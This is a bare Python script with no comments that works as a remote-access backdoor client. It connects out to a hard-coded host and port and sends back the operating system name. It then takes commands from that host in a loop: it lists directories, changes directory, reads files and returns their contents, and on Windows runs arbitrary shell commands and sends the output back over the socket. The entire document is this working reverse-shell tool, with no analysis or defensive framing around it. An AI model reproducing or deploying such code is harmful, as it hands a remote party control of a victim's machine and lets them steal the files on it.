import subprocess ,socket, os, json, zlib, platform, locale, stat, time

try:
    s = socket.socket()
    sip = '169.254.0.3'
    sport = 8787
    s.connect((sip, sport))
    running = True
    SYSTEM = platform.system()
    s.sendall(SYSTEM.encode())
    data = s.recv(4096)
    COMMANDS: dict = json.loads(zlib.decompress(data).decode())
    while running:
        result = ''
        cmd = s.recv(2048).decode().strip()
        cmd, *args = cmd.split(' ')
        if cmd == 'delete':
            raise
        if COMMANDS.get(cmd) == None:
            s.sendall(cmd.encode() + b' unknow command')
        else:
            if COMMANDS[cmd] == 0:
                if args:
                    times = 1
                    for directory in args:
                        path = os.path.abspath(directory)
                        if not os.path.exists(path):
                            result += 'File not found'
                            continue
                        temp_result = os.listdir(os.path.abspath(directory))
                        temp_result = ['f '+ s if os.path.isfile(s) else 'd '+ s for s in temp_result]
                        if times > 1:
                            result += '\n\n'
                        result += os.path.abspath(path) + '\n'
                        result += '\n'.join(temp_result)
                        times += 1
                else:
                    result += os.path.abspath('') + '\n'
                    for filename in os.listdir():
                        size = os.path.getsize(os.path.abspath(filename))
                        status = os.stat(os.path.abspath(filename))
                        auth = stat.filemode(status.st_mode)
                        create_time = time.strftime('%y/%m/%d %H:%M:%S',time.gmtime(status.st_ctime))
                        if status.st_nlink > 1:
                            filename = filename + '->' + os.path.realpath(filename)
                        temp_result = '{} {: >8} {} {}'.format(auth, size, create_time, filename)
                        result += temp_result + '\n'
            elif COMMANDS[cmd] == 1:
                path = os.path.abspath(args[0])
                if not os.path.exists(path):
                    result += 'File not found'
                else:
                    os.chdir(path)
                    result += 'ok'
            elif COMMANDS[cmd] == 2:
                running = False
                s.close()
                continue
            elif COMMANDS[cmd] == 3:
                for filename in args:
                    if not os.path.exists(os.path.abspath(filename)):
                        result += 'File not found'
                        continue
                    with open(filename, 'r', encoding='utf8') as f:
                        result += f.read()
            elif COMMANDS[cmd] == 4:
                result += os.path.abspath(os.path.dirname('.'))
            elif COMMANDS[cmd] == 5:
                if SYSTEM == 'Windows':
                    p = subprocess.run([*args], stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
                    if p.stdout:
                        result += p.stdout.decode(locale.getlocale()[1])
                    else:
                        result += p.stderr.decode(locale.getlocale()[1])
        s.sendall(result.encode())
except Exception as e:
    print(e)
    s.close()